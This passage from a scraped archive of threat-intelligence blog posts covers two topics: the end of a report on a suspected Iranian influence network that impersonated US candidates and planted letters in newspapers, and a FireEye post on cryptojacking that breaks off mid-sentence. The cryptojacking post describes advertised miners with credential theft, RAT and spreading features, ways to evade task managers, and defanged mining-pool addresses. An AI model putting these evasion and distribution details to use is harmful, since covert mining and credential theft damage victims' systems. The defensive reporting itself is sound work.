District, using a photograph of Butler for its profile picture and incorporating her campaign slogans into its background picture, as well as claiming in its Twitter bio to be a “US House candidate, NY-13” and linking to Butler’s website, jineeabutlerforcongress.com. Figure 4: Suspect account @ButlerJineea (left); apparent legitimate, currently inactive account @Jineea4congress (right) These and other accounts in the network plagiarized tweets from additional sources beyond the individuals they impersonated, including other U.S. politicians, about both political and apolitical topics. Influence Activity Leveraged U.S. and Israeli Media In addition to directly posting material on social media, we observed some personas in the network leverage legitimate print and online media outlets in the U.S. and Israel to promote Iranian interests via the submission of letters, guest columns, and blog posts that were then published. We also identified personas that we suspect were fabricated for the sole purpose of submitting such letters, but that do not appear to maintain accounts on social media. The personas claimed to be based in varying locations depending on the news outlets they were targeting for submission; for example, a persona that listed their location as Seattle, WA in a letter submitted to the Seattle Times subsequently claimed to be located in Baytown, TX in a letter submitted to The Baytown Sun . Other accounts in the network then posted links to some of these letters on social media. The letters and columns, many of which were published in 2018 and 2019, but which date as far back as 2015, were mostly published in small, local U.S. news outlets; however, several larger outlets have also published material that we suspect was submitted by these personas (see Appendix 2). In at least two cases, the text of letters purportedly authored by different personas and published in different newspapers was identical or nearly identical, while in other instances, separate personas promoted the same narratives in letters published within several days of each other. The published material was not limited to letters; one persona, “John Turner,” maintained a blog on The Times of Israel website from January 2017 to November 2018, and wrote articles for the U.S.-based site Natural News Blogs from August 2015 to July 2018. The letters and articles primarily addressed themes or promoted stances in line with Iranian political interests, similar to the activity conducted on social media. Figure 5: Sample letter published in Galveston County’s (Texas) The Daily News, authored by suspect persona Mathew O’Brien We have thus far identified at least five suspicious personas that have had letters or other content published by legitimate news outlets. We surmise that additional personas exist, based on other investigatory leads. “John Turner” : The John Turner persona has been active since at least 2015. Turner has claimed to be based, variously, in New York, NY, Seattle, WA, and Washington, DC. Turner described himself as a journalist in his Twitter profile, though has also claimed both to work at the Seattle Times and to be a student at Villanova University, claiming to be attending between 2015 and 2020. In addition to letters published in various news outlets, John Turner maintained a blog on The Times of Israel site in 2017 and 2018 and has written articles for Natural News Blogs . At least one of Turner’s letters was promoted in a tweet by another account in the network. “Ed Sullivan” : The Ed Sullivan persona, which has on at least one occasion used the same headshot as that of John Turner, has had letters published in the Galveston County, Texas-based The Daily News , the New York Daily News , and the Los Angeles Times , including some letters identical in text to those authored by the “Jeremy Watte” persona (see below) published in the Texas-based outlet The Baytown Sun . Ed Sullivan has claimed his location to be, variously, Galveston and Newport News (Virginia). “Mathew Obrien” : The Mathew Obrien persona, whose name has also been spelled “Matthew Obrien” and “Mathew O’Brien”, claimed in his Twitter bio to be a Newsday correspondent. The persona has had letters published in Galveston County’s The Daily News and the Athens, Texas-based Athens Daily Review ; in those letters, his claimed locations were Galveston and Athens, respectively, while the persona’s Twitter account, @MathewObrien1, listed a location of New York, NY. At least one of Obrien’s letters was promoted in a tweet by another account in the network. “Jeremy Watte” : Letters signed by the Jeremy Watte persona have been published in The Baytown Sun and the Seattle Times , where he claimed to be based in Baytown and Seattle, respectively. The texts of at least two letters signed by Jeremy Watte are identical to that in letters published in other newspapers under the name Ed Sullivan. At least one of his letters was promoted in a tweet by another account in the network. “Isabelle Kingsly” : The Isabelle Kingsly persona claimed on her Twitter profile (@IsabelleKingsly) to be an “Iranian-American” based in Seattle, WA. Letters signed by Kingsly have appeared in The Baytown Sun and the Newport News Virginia local paper The Daily Press ; in those letters, Kingsly’s location is listed as Galveston and Newport News, respectively. The @IsabelleKingsly Twitter account’s profile picture and other posted pictures were appropriated from a social media account of what appears to be a real individual with the same first name of Isabelle. At least one of Kingsly’s letters was promoted in a tweet by another account in the network. Other Media Activity Personas in the network also engaged in other media-related activity, including criticism and solicitation of mainstream media coverage, and conducting remote video and audio interviews with real U.S. and UK-based individuals while presenting themselves as journalists. One of those latter personas presented as working for a mainstream news outlet. Criticism/Solicitation of Media Coverage Accounts in the network directed tweets at mainstream media outlets, calling on them to provide coverage of topics aligned with Iranian interests or, alternatively, criticizing them for insufficient coverage of those topics. For example, we observed accounts criticizing media outlets over their lack of coverage of the killing of Shiite child Zakaria al-Jaber in Saudi Arabia, as well as Saudi Arabia’s conduct in the Yemen conflict. While such activity might have been intended to directly influence the media outlets’ reporting, the accounts may have also been aiming to reach a wider audience by tweeting at outlets with a large following that woud see those replies. Figure 6: Sample tweets by suspect accounts calling on mainstream media outlets to increase their coverage of alleged Saudi activity in the Yemen conflict “Media” Interviews with Real U.S., UK-Based Individuals Accounts in the network, under the guise of journalist personas, also solicited various individuals over Twitter for interviews and chats, including real journalists and politicians. The personas appear to have successfully conducted remote video and audio interviews with U.S. and UK-based individuals, including a prominent activist, a radio talk show host, and a former U.S. Government official, and subsequently posted the interviews on social media, showing only the individual being interviewed and not the interviewer. The interviewees expressed views that Iran would likely find favorable, discussing topics such as the February 2019 Warsaw summit, an attack on a military parade in the Iranian city of Ahvaz, and the killing of Jamal Khashoggi. The provenance of these interviews appear to have been misrepresented on at least one occasion, with one persona appearing to have falsely claimed to be operating on behalf of a mainstream news outlet; a remote video interview with a US-based activist about the Jamal Khashoggi killing was posted by an account adopting the persona of a journalist from the outlet Newsday , with the Newsday logo also appearing in the video. We did not identify any Newsday interview with the activist in question on this topic. In another instance, a persona posing as a journalist directed tweets containing audio of an interview conducted with a former U.S. Government official at real media personalities, calling on them to post about the interview. Conclusion We are continuing to investigate this and potentially related activity that may be being conducted by actors in support of Iranian interests. At this time, we are unable to provide further attribution for this activity, and we note the possibility that the activity could have been designed for alternative purposes or include some small percentage of authentic behavior. However, if it is of Iranian origin or supported by Iranian state actors, it would demonstrate that Iranian influence tactics extend well beyond the use of inauthentic news sites and fake social media personas, to also include the impersonation of real individuals on social media and the leveraging of legitimate Western news outlets to disseminate favorable messaging. If this activity is being conducted by the same or related actors as those responsible for the Liberty Front Press network of inauthentic news sites and affiliated social media accounts that we exposed in August 2018, it may also suggest that these actors remain undeterred by public exposure or by social media platforms’ shutdowns of their accounts, and that they continue to seek to influence audiences within the U.S. toward positions in line with Iranian political interests. Appendices Appendix 1: Sample Twitter accounts identified in this network, currently suspended. Username Display Name Bio Creation Date Location @MichaelA22444 Michael Anderson Free journalist #resist 3/16/2019 DC @sammichelsn1995 Sam Michelson Journalist. In search of reality. 1995. Resistance. 3/14/2019 @JasonCa26738291 Jason Campbell It’s our duty to leave our Country-to our children-better than we found it 2/20/2019 @SaraMar44752473 Sara Martin 1/24/2019 @LisaBro09759828 Lisa Brown 1/24/2019 @Jennife67352965 Jennifer Parker I AM 1/23/2019 @SusanSc25255529 Susan Scott Don't think too hard, just have fun with life... 1/22/2019 @LindaJa02370118 Linda Jackson I drink lots of tea... 1/22/2019 @MarkAda05568324 Mark Adams 1/22/2019 @aliisseeeee alliisse Liberty 1/21/2019 New York @morsi18 morsi 1/13/2019 @AntiReality2 Anti_Reality Very angry mad at politicians In favor of sick minds 1/9/2019 North Carolina, USA @JennyMick3 Jenny Mick Unemployment Widow mother of two 1/9/2019 Pennsylvania, USA @JaneAnton9 Jane Anton Daughter of best parent. Do your best, just let your success shows your efforts. 1/9/2019 California, USA @RabinAntonio Antonio Rabin Student at Harvard college. somehow into politics. I love gym 1/9/2019 @Angelofhuman1 Angel of human I do into beauty and humanity 12/26/2018 California, USA @AliciaHernan3 Alicia Hernan Wife, mom of tow sons, student, in favor of peace. 12/26/2018 New York, USA @ThomasRace3 Thomas Race Bodybuilding sports and into Music and gym 12/25/2018 Michigan, USA @EmmaWil14155495 Emma Wilkerson Student in college  studying International law 12/25/2018 Sunnyvale, CA @Kevin24798000 Kevin A free person from everywhere I'm somehow into politics 12/15/2018 New York, USA @ImanRashedii Iman Rashed Correspondent at  https://t.co/3hxSgtkuXh.  🎥📸Freelance Journalist.    ➡️➡️oppose War and Brutality 💆‍♂️I was born in Beirut 12/8/2018 London @emAnderson1996 emily anderson In search of peace. Really into politics and justice. Love US and other countries. 10/6/2018 New York, USA @FordNaava naava ford 10/2/2018 @MaazRoss maaz ross follow back 9/30/2018 @sam86523055 ResistSam high educated free journalist in favor of politics in search of reality Middle East issues 9/29/2018 New York, USA @ButlerJineea Jineea Butler US House candidate, NY-13 9/26/2018 U.S. Congressional Candidate for NY District 13 serving Harlem, Washington Heights and Western Bronx.US @TynioAnya Anya Tynio 9/26/2018 @livengood_marla Marla Livengood 9/23/2018 @Fall_Of_Amercia Fall_of_Amercia save the US 9/8/2018 Washington, DC @IsabelleKingsly Elizabeth Warren not for 2020 Single. Iranian-American. Lifestyle.And a tad of politics. @ewarren not for 2020. 9/8/2018 Seattle, WA @MathewObrien1 Mathew Obrien A single boy,@Newsday correspondent , interested in news Scientist🔬. Animal 🐘 and Nature lover🌲, hiker and backpacker♍   . 6/21/2018 New York, NY @HumanBeingUSA Human-Rights The fight for human rights never sleeps, standing up for human rights across the world, wherever justice, freedom, fairness and truth are denied. 6/14/2018 New York, USA @ashleyc57528342 ashley cohen follow me to get follow back 6/14/2018 Arizona, USA @josefsanchezzzz josef sanchez 6/10/2018 @GuillouJan jan guillou 5/13/2018 @saidqutb2 saidqutb 5/12/2018 @olegkashin4321 rajat sharma 5/8/2018 @Suzan_Nicolson Suzan Nicholson follow me to get follow back 5/8/2018 Las Vegas, NV @caroloffoff diana culi 5/7/2018 @hairullomirsaid guillem balague 5/7/2018 @habibayyoub1 habib ayyoub 5/6/2018 @daphneposh James Anderson No Magats 🚫, 🔥 Anti War & Hate, Pro Equality, Humanity, Humor & Sensible Gun Reform 4/30/2018 New York, USA @JohnHoward333 John H.T Journalist. RTs Are not necessarily endorsements. All views my own. #Resist 5/12/2015 Washington, USA @AlexRyanNY Alex Ryan New Yorker, @Newsday correspondent. You don't have a soul. You are a Soul. You have a body. 4/17/2011 New York, USA Table 1: Sample Twitter accounts identified in this network Appendix 2: Sample letters published in news outlets submitted by personas identified in this network, August 2018 to April 2019. Date Author Author’s Listed Location Newspaper Article Aug. 1, 2018 Jeremy Watte Baytown The Baytown Sun (baytownsun.com) Title: “Trump’s wall just a vanity project” The letter argues against the Trump administration’s proposed border wall with Mexico. The text of the letter is identical to that published in Galveston County’s The Daily News (galvnews.com) on Aug. 4, 2018, three days later. http://baytownsun.com/opinion/article_85fa9df4-9527-11e8-9aa8-1bb745e7141a.html Aug. 4, 2018 Ed Sullivan Galveston Galveston County’s The Daily News (galvnews.com) Title: “Trump cares not one wit about effects of shutdown” The text of the letter is identical to that published in The Baytown Sun on Aug. 1. https://www.galvnews.com/opinion/guest_columns/article_7d5b3e9b-cbdd-5ac8-8c91-3a1eb0da3df7.html Oct. 11, 2018 Jeremy Watte Baytown The Baytown Sun (baytownsun.com) Title: “Time to fight for it” The letter, written from the point of view of an individual aligned with the U.S. political left, calls on individuals to fight for justice. http://baytownsun.com/opinion/article_915fde6c-ccf3-11e8-a085-33dce44563d1.html Oct. 23, 2018 Ed Sullivan Newport News New York Daily News (nydailynews.com) Title: “Don’t shrug off Khashoggi’s murder” The letter argues that “the most fitting and best memorial to Jamal Khashoggi,” a Saudi journalist who was murdered in the Saudi embassy in Istanbul, “would be the swift end to the war in Yemen.” https://www.nydailynews.com/dp-edt-letswed-1024-story.html Oct. 23, 2018 Ed Sullivan Newport News Los Angeles Times (latimes.com) Title: “Don’t shrug off Khashoggi’s murder” The letter is identical to that published in the New York Daily News on the same day. https://www.latimes.com/dp-edt-letswed-1024-story.html Nov. 27, 2018 John Turner New York, NY Times of Israel (blog.timesofisrael.com) Title: “Saudi Arabia’s foreign policy is failing” The letter states that the murder of Jamal Khashoggi is “the latest in a series of foreign policy blunders” committed by the Saudi Crown Prince Mohammed Bin Salman. https://blogs.timesofisrael.com/saudi-arabias-foreign-policy-is-failing/ Nov. 30, 2018 John Turner New York, NY Times of Israel (blog.timesofisrael.com) Title: “Relations with Israel will not benefit Gulf states” The letter argues that the Gulf states will not benefit from normalized relations with Israel, stating that “the Arab street” would not support those relations and that such a move would be risky for “the Gulf’s unelected rulers.” https://blogs.timesofisrael.com/relations-with-israel-will-not-benefit-gulf-states/ Dec. 26, 2018 Isabelle Kingsly Galveston The Baytown Sun (baytownsun.com) Title: “Wild West sheriff” The letter argues that Trump is not an aberration in U.S. history, but rather an ideological descendant of various U.S. historical currents; the article also calls him “an authoritarian, racist madman.” http://baytownsun.com/opinion/letters/article_4ad26b8c-08bb-11e9-9056-3f5207ea4cf7.html Jan. 18, 2019 Jeremy Watte Seattle Seattle Times (seattletimes.com) Title: “ISIS’ ideology not defeated” The letter, written in response to an article about Americans killed by an ISIS suicide bomber in Syria, asserts that the Islamic extremist ideology espoused by the terrorist group remains undefeated. https://www.seattletimes.com/opinion/letters-to-the-editor/isis-ideology-not-defeated/ March 1, 2019 Jeremy Watte Baytown The Baytown Sun (baytownsun.com) Title: “Sins of Saudi Arabia” The letter is condemnatory of Saudi Arabia, citing its actions in the Yemen conflict, the killing of Jamal Khashoggi, the killing of Zakaria al-Jaber, a Shiite child, in Medina, and the imprisonment of Saudi women activists. The letter also defends Iran, stating that it is not responsible for similar crimes. http://baytownsun.com/opinion/article_4c8f1d4e-3bce-11e9-a391-37761ca39ef2.html April 9, 2019 Mathew Obrien Galveston Galveston County’s The Daily News (galvnews.com) Title: “Sanctioning Islamic corps is pure madness” The letter condemns the Trump administration’s designation of the IRGC as a Foreign Terrorist Organization and claims that Trump is seeking to start a war with Iran. https://www.galvnews.com/opinion/letters_to_editor/article_860e6c9b-1e22-5871-a1ea-d8d466fccc94.html April 11, 2019 Matthew Obrien Athens Athens Daily Review (athensreview.com) Title: “Trump, Bolton trying to start war with Iran” The letter, similar to the April 9 letter published in Galveston County’s The Daily News, claims that Trump and Bolton are trying to start a war with Iran to use the war in Trump’s 2020 presidential campaign, while disregarding the alleged crimes of Saudi Arabia. https://www.athensreview.com/opinion/letters_to_the_editor/trump-bolton-trying-to-start-war-with-iran/article_e41a029e-5ca5-11e9-b59b-4f174bf94dcd.html April 11, 2019 Isabelle Kingsly Newport News Daily Press (dailypress.com) Title: “An uneasy path – Re; Recent Iran sanction reports” The letter also argues that Trump and Bolton are seeking to start a war with Iran toward political ends. https://www.dailypress.com/news/opinion/letters/dp-edt-letsfri-0412-story.html April 19, 2019 Jeremy Watte Baytown The Baytown Sun (baytownsun.com) Title: “Escalating hostility toward Iran” The letter argues that the election of Trump to the U.S. presidency has set the U.S. on a dangerous course and condemns the U.S. withdrawal from the Iran nuclear deal (JCPOA), stating that “the ayatollahs have welcomed this abrogation of honor on Trump’s part.” http://baytownsun.com/opinion/article_fd3f8bfa-6249-11e9-992a-d373a2b5a5a4.html April 23, 2019 Ed Sullivan Galveston Galveston County’s The Daily News (galvnews.com) Title: “Escalating hostility toward Iran is wrong, dangerous” The text of this letter is nearly identical to that authored by Jeremy Watte and published in The Baytown Sun on April 19, excepting changes made in several sentences. https://www.galvnews.com/opinion/letters_to_editor/article_0409879b-fff9-5ab8-bbf5-a49a1c1592d9.html Table 2: Sample letters published in news outlets submitted by personas in this network Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/07/cryptocurrencies-cyber-crime-growth-of-miners.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-07-18",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Cyber criminals tend to favor cryptocurrencies because they provide a certain level of anonymity and can be easily monetized. This interest has increased in recent years , stemming far beyond the desire to simply use cryptocurrencies as a method of payment for illicit tools and services. Many actors have also attempted to capitalize on the growing popularity of cryptocurrencies, and subsequent rising price, by conducting various operations aimed at them. These operations include malicious cryptocurrency mining (also referred to as cryptojacking), the collection of cryptocurrency wallet credentials, extortion activity, and the targeting of cryptocurrency exchanges. This blog post discusses the various trends that we have been observing related to cryptojacking activity, including cryptojacking modules being added to popular malware families, an increase in drive-by cryptomining attacks, the use of mobile apps containing cryptojacking code, cryptojacking as a threat to critical infrastructure, and observed distribution mechanisms. What Is Mining? As transactions occur on a blockchain, those transactions must be validated and propagated across the network. As computers connected to the blockchain network (aka nodes) validate and propagate the transactions across the network, the miners include those transactions into \"blocks\" so that they can be added onto the chain. Each block is cryptographically hashed, and must include the hash of the previous block, thus forming the \"chain\" in blockchain. In order for miners to compute the complex hashing of each valid block, they must use a machine's computational resources. The more blocks that are mined, the more resource-intensive solving the hash becomes. To overcome this, and accelerate the mining process, many miners will join collections of computers called \"pools\" that work together to calculate the block hashes. The more computational resources a pool harnesses, the greater the pool's chance of mining a new block. When a new block is mined, the pool's participants are rewarded with coins. Figure 1 illustrates the roles miners play in the blockchain network. Figure 1: The role of miners Underground Interest FireEye iSIGHT Intelligence has identified eCrime actor interest in cryptocurrency mining-related topics dating back to at least 2009 within underground communities. Keywords that yielded significant volumes include miner, cryptonight, stratum, xmrig, and cpuminer. While searches for certain keywords fail to provide context, the frequency of these cryptocurrency mining-related keywords shows a sharp increase in conversations beginning in 2017 (Figure 2). It is probable that at least a subset of actors prefer cryptojacking over other types of financially motivated operations due to the perception that it does not attract as much attention from law enforcement. Figure 2: Underground keyword mentions Monero Is King The majority of recent cryptojacking operations have overwhelmingly focused on mining Monero, an open-source cryptocurrency based on the CryptoNote protocol, as a fork of Bytecoin. Unlike many cryptocurrencies, Monero uses a unique technology called \"ring signatures,\" which shuffles users' public keys to eliminate the possibility of identifying a particular user, ensuring it is untraceable. Monero also employs a protocol that generates multiple, unique single-use addresses that can only be associated with the payment recipient and are unfeasible to be revealed through blockchain analysis, ensuring that Monero transactions are unable to be linked while also being cryptographically secure. The Monero blockchain also uses what's called a \"memory-hard\" hashing algorithm called CryptoNight and, unlike Bitcoin's SHA-256 algorithm, it deters application-specific integrated circuit (ASIC) chip mining. This feature is critical to the Monero developers and allows for CPU mining to remain feasible and profitable. Due to these inherent privacy-focused features and CPU-mining profitability, Monero has become an attractive option for cyber criminals. Underground Advertisements for Miners Because most miner utilities are small, open-sourced tools, many criminals rely on crypters. Crypters are tools that employ encryption, obfuscation, and code manipulation techniques to keep their tools and malware fully undetectable (FUD). Table 1 highlights some of the most commonly repurposed Monero miner utilities. XMR Mining Utilities XMR-STACK MINERGATE XMRMINER CCMINER XMRIG CLAYMORE SGMINER CAST XMR LUKMINER CPUMINER-MULTI Table 1: Commonly used Monero miner utilities The following are sample advertisements for miner utilities commonly observed in underground forums and markets. Advertisements typically range from stand-alone miner utilities to those bundled with other functions, such as credential harvesters, remote administration tool (RAT) behavior, USB spreaders, and distributed denial-of-service (DDoS) capabilities. Sample Advertisement #1 (Smart Miner + Builder) In early April 2018, actor \"Mon£y\" was observed by FireEye iSIGHT Intelligence selling a Monero miner for $80 USD – payable via Bitcoin, Bitcoin Cash, Ether, Litecoin, or Monero – that included unlimited builds, free automatic updates, and 24/7 support. The tool, dubbed Monero Madness (Figure 3), featured a setting called Madness Mode that configures the miner to only run when the infected machine is idle for at least 60 seconds. This allows the miner to work at its full potential without running the risk of being identified by the user. According to the actor, Monero Madness also provides the following features: Unlimited builds Builder GUI (Figure 4) Written in AutoIT (no dependencies) FUD Safer error handling Uses most recent XMRig code Customizable pool/port Packed with UPX Works on all Windows OS (32- and 64-bit) Madness Mode option Figure 3: Monero Madness Figure 4: Monero Madness builder Sample Advertisement #2 (Miner + Telegram Bot Builder) In March 2018, FireEye iSIGHT Intelligence observed actor \"kent9876\" advertising a Monero cryptocurrency miner called Goldig Miner (Figure 5). The actor requested payment of $23 USD for either CPU or GPU build or $50 USD for both. Payments could be made with Bitcoin, Ether, Litecoin, Dash, or PayPal. The miner ostensibly offers the following features: Written in C/C++ Build size is small (about 100–150 kB) Hides miner process from popular task managers Can run without Administrator privileges (user-mode) Auto-update ability All data encoded with 256-bit key Access to Telegram bot-builder Lifetime support (24/7) via Telegram Figure 5: Goldig Miner advertisement Sample Advertisement #3 (Miner + Credential Stealer) In March 2018, FireEye iSIGHT Intelligence observed actor \"TH3FR3D\" offering a tool dubbed Felix (Figure 6) that combines a cryptocurrency miner and credential stealer. The actor requested payment of $50 USD payable via Bitcoin or Ether. According to the advertisement, the Felix tool boasted the following features: Written in C# (Version 1.0.1.0) Browser stealer for all major browsers (cookies, saved passwords, auto-fill) Monero miner (uses minergate.com pool by default, but can be configured) Filezilla stealer Desktop file grabber (.txt and more) Can download and execute files Update ability USB spreader functionality PHP web panel Figure 6: Felix HTTP Sample Advertisement #4 (Miner + RAT) In January 2018, FireEye iSIGHT Intelligence observed actor \"ups\" selling a miner for any Cryptonight-based cryptocurrency (e.g., Monero and Dashcoin) for either Linux or Windows operating systems. In addition to being a miner, the tool allegedly provides local privilege escalation through the CVE-2016-0099 exploit, can download and execute remote files, and receive commands. Buyers could purchase the Windows or Linux tool for €200 EUR, or €325 EUR for both the Linux and Windows builds, payable via Monero, bitcoin, ether, or dash. According to the actor, the tool offered the following: Windows Build Specifics Written in C++ (no dependencies) Miner component based on XMRig Easy cryptor and VPS hosting options Web panel (Figure 7) Uses TLS for secured communication Download and execute Auto-update ability Cleanup routine Receive remote commands Perform privilege escalation Features \"game mode\" (mining stops if user plays game) Proxy feature (based on XMRig) Support (for €20/month) Kills other miners from list Hidden from TaskManager Configurable pool, coin, and wallet (via panel) Can mine the following Cryptonight-based coins: Monero Bytecoin Electroneum DigitalNote Karbowanec Sumokoin Fantomcoin Dinastycoin Dashcoin LeviarCoin BipCoin QuazarCoin Bitcedi Linux Build Specifics Issues running on Linux servers (higher performance on desktop OS) Compatible with AMD64 processors on Ubuntu, Debian, Mint (support for CentOS later) Figure 7: Miner bot web panel Sample Advertisement #5 (Miner + USB Spreader + DDoS Tool) In August 2017, actor \"MeatyBanana\" was observed by FireEye iSIGHT Intelligence selling a Monero miner utility that included the ability to download and execute files and perform DDoS attacks. The actor offered the software for $30 USD, payable via Bitcoin. Ostensibly, the tool works with CPUs only and offers the following features: Configurable miner pool and port (default to minergate) Compatible with both 64- and 86-bit Windows OS Hides from the following popular task managers: Windows Task Manager Process Killer KillProcess System Explorer Process Explorer AnVir Process Hacker Masked as a system driver Does not require administrator privileges No dependencies Registry persistence mechanism Ability to perform \"tasks\" (download and execute files, navigate to a site, and perform DDoS) USB spreader Support after purchase The Cost of Cryptojacking The presence of mining software on a network can generate costs on three fronts as the miner surreptitiously allocates resources: Degradation in system performance Increased cost in electricity Potential exposure of security holes Cryptojacking targets computer processing power, which can lead to high CPU load and degraded performance. In extreme cases, CPU overload may even cause the operating system to crash. Infected machines may also attempt to infect neighboring machines and therefore generate large amounts of traffic that can overload victims' computer networks. In the case of operational technology (OT) networks, the consequences could be severe. Supervisory control and data acquisition/industrial control systems (SCADA/ICS) environments predominately rely on decades-old hardware and low-bandwidth networks, therefore even a slight increase in CPU load or the network could leave industrial infrastructures unresponsive, impeding operators from interacting with the controlled process in real-time. The electricity cost, measured in kilowatt hour (kWh), is dependent upon several factors: how often the malicious miner software is configured to run, how many threads it's configured to use while running, and the number of machines mining on the victim's network. The cost per kWh is also highly variable and depends on geolocation. For example, security researchers who ran Coinhive on a machine for 24 hours found that the electrical consumption was 1.212kWh. They estimated that this equated to electrical costs per month of $10.50 USD in the United States, $5.45 USD in Singapore, and $12.30 USD in Germany. Cryptojacking can also highlight often overlooked security holes in a company's network. Organizations infected with cryptomining malware are also likely vulnerable to more severe exploits and attacks, ranging from ransomware to ICS-specific malware such as TRITON . Cryptocurrency Miner Distribution Techniques In order to maximize profits, cyber criminals widely disseminate their miners using various techniques such as incorporating cryptojacking modules into existing botnets, drive-by cryptomining attacks, the use of mobile apps containing cryptojacking code, and distributing cryptojacking utilities via spam and self-propagating utilities. Threat actors can use cryptojacking to affect numerous devices and secretly siphon their computing power. Some of the most commonly observed devices targeted by these cryptojacking schemes are: User endpoint machines Enterprise servers Websites Mobile devices Industrial control systems Cryptojacking in the Cloud Private sector companies and governments alike are increasingly moving their data and applications to the cloud , and cyber threat groups have been moving with them. Recently, there have been various reports of actors conducting cryptocurrency mining operations specifically targeting cloud infrastructure. Cloud infrastructure is increasingly a target for cryptojacking operations because it offers actors an attack surface with large amounts of processing power in an environment where CPU usage and electricity costs are already expected to be high, thus allowing their operations to potentially go unnoticed. We assess with high confidence that threat actors will continue to target enterprise cloud networks in efforts to harness their collective computational resources for the foreseeable future. The following are some real-world examples of cryptojacking in the cloud: In February 2018, FireEye researchers published a blog detailing various techniques actors used in order to deliver malicious miner payloads (specifically to vulnerable Oracle servers) by abusing CVE-2017-10271. Refer to our blog post for more detailed information regarding the post-exploitation and pre-mining dissemination techniques used in those campaigns. In March 2018, Bleeping Computer reported on the trend of cryptocurrency mining campaigns moving to the cloud via vulnerable Docker and Kubernetes applications, which are two software tools used by developers to help scale a company's cloud infrastructure. In most cases, successful attacks occur due to misconfigured applications and/or weak security controls and passwords. In February 2018, Bleeping Computer also reported on hackers who breached Tesla's cloud servers to mine Monero. Attackers identified a Kubernetes console that was not password protected, allowing them to discover login credentials for the broader Tesla Amazon Web services (AWS) S3 cloud environment. Once the attackers gained access to the AWS environment via the harvested credentials, they effectively launched their cryptojacking operations. Reports of cryptojacking activity due to misconfigured AWS S3 cloud storage buckets have also been observed, as was the case in the LA Times online compromise in February 2018. The presence of vulnerable AWS S3 buckets allows anyone on the internet to access and change hosted content, including the ability to inject mining scripts or other malicious software. Incorporation of Cryptojacking into Existing Botnets FireEye iSIGHT Intelligence has observed multiple prominent botnets such as Dridex and Trickbot incorporate cryptocurrency mining into their existing operations. Many of these families are modular in nature and have the ability to download and execute remote files, thus allowing the operators to easily turn their infections into cryptojacking bots. While these operations have traditionally been aimed at credential theft (particularly of banking credentials), adding mining modules or downloading secondary mining payloads provides the operators another avenue to generate additional revenue with little effort. This is especially true in cases where the victims were deemed unprofitable or have already been exploited in the original scheme. The following are some real-world examples of cryptojacking being incorporated into existing botnets: In early February 2018, FireEye iSIGHT Intelligence observed Dridex botnet ID 2040 download a Monero cryptocurrency miner based on the open-source XMRig miner. On Feb. 12, 2018, FireEye iSIGHT Intelligence observed the banking malware IcedID injecting Monero-mining JavaScript into webpages for specific, targeted URLs. The IcedID injects launched an anonymous miner using the mining code from Coinhive's AuthedMine. In late 2017, Bleeping Computer reported that security researchers with Radware observed the hacking group CodeFork leveraging the popular downloader Andromeda (aka Gamarue) to distribute a miner module to their existing botnets. In late 2017, FireEye researchers observed Trickbot operators deploy a new module named \"testWormDLL\" that is a statically compiled copy of the popular XMRig Monero miner. On Aug. 29, 2017, Security Week reported on a variant of the popular Neutrino banking Trojan, including a Monero miner module. According to their reporting, the new variant no longer aims at stealing bank card data, but instead is limited to downloading and executing modules from a remote server. Drive-By Cryptojacking In-Browser FireEye iSIGHT Intelligence has examined various customer reports of browser-based cryptocurrency mining. Browser-based mining scripts have been observed on compromised websites, third-party advertising platforms, and have been legitimately placed on websites by publishers. While coin mining scripts can be embedded directly into a webpage's source code, they are frequently loaded from third-party websites. Identifying and detecting websites that have embedded coin mining code can be difficult since not all coin mining scripts are authorized by website publishers, such as in the case of a compromised website. Further, in cases where coin mining scripts were authorized by a website owner, they are not always clearly communicated to site visitors. At the time of reporting, the most popular script being deployed in the wild is Coinhive. Coinhive is an open-source JavaScript library that, when loaded on a vulnerable website, can mine Monero using the site visitor's CPU resources, unbeknownst to the user, as they browse the site. The following are some real-world examples of Coinhive being deployed in the wild: In September 2017, Bleeping Computer reported that the authors of SafeBrowse, a Chrome extension with more than 140,000 users, had embedded the Coinhive script in the extension's code that allowed for the mining of Monero using users' computers and without getting their consent. During mid-September 2017, users on Reddit began complaining about increased CPU usage when they navigated to a popular torrent site, The Pirate Bay (TPB). The spike in CPU usage was a result of Coinhive's script being embedded within the site's footer. According to TPB operators, it was implemented as a test to generate passive revenue for the site (Figure 8). In December 2017, researchers with Sucuri reported on the presence of the Coinhive script being hosted on GitHub.io, which allows users to publish web pages directly from GitHub repositories. Other reporting disclosed the Coinhive script being embedded on the Showtime domain as well as on the LA Times website , both surreptitiously mining Monero. A majority of in-browser cryptojacking activity is transitory in nature and will last only as long as the user’s web browser is open. However, researchers with Malwarebytes Labs uncovered a technique that allows for continued mining activity even after the browser window is closed. The technique leverages a pop-under window surreptitiously hidden under the taskbar. As researchers pointed out, closing the browser window may not be enough to interrupt the activity, and that more advanced actions like running the Task Manager may be required. Figure 8: Statement from TPB operators on Coinhive script Malvertising and Exploit Kits Malvertisements – malicious ads on legitimate websites – commonly redirect visitors of a site to an exploit kit landing page. These landing pages are designed to scan a system for vulnerabilities, exploit those vulnerabilities, and download and execute malicious code onto the system. Notably, the malicious advertisements can be placed on legitimate sites and visitors can become infected with little to no user interaction. This distribution tactic is commonly used by threat actors to widely distribute malware and has been employed in various cryptocurrency mining operations. The following are some real-world examples of this activity: In early 2018, researchers with Trend Micro reported that a modified miner script was being disseminated across YouTube via Google's DoubleClick ad delivery platform. The script was configured to generate a random number variable between 1 and 100, and when the variable was above 10 it would launch the Coinhive script coinhive.min.js , which harnessed 80 percent of the CPU power to mine Monero. When the variable was below 10 it launched a modified Coinhive script that was also configured to harness 80 percent CPU power to mine Monero. This custom miner connected to the mining pool wss[:]//ws[.]l33tsite[.]info:8443, which was likely done to avoid Coinhive's fees. In April 2018, researchers with Trend Micro also discovered a JavaScript code based on Coinhive injected into an AOL ad platform. The miner used the following private mining pools: wss[:]//wsX[.]www.datasecu[.]download/proxy and wss[:]//www[.]jqcdn[.]download:8893/proxy. Examination of other sites compromised by this campaign showed that in at least some cases the operators were hosting malicious content on unsecured AWS S3 buckets. Since July 16, 2017, FireEye has observed the Neptune Exploit Kit redirect to ads for hiking clubs and MP3 converter domains. Payloads associated with the latter include Monero CPU miners that are surreptitiously installed on victims' computers. In January 2018, Check Point researchers discovered a malvertising campaign leading to the Rig Exploit Kit, which served the XMRig Monero miner utility to unsuspecting victims. Mobile Cryptojacking In addition to targeting enterprise servers and user machines, threat actors have also targeted 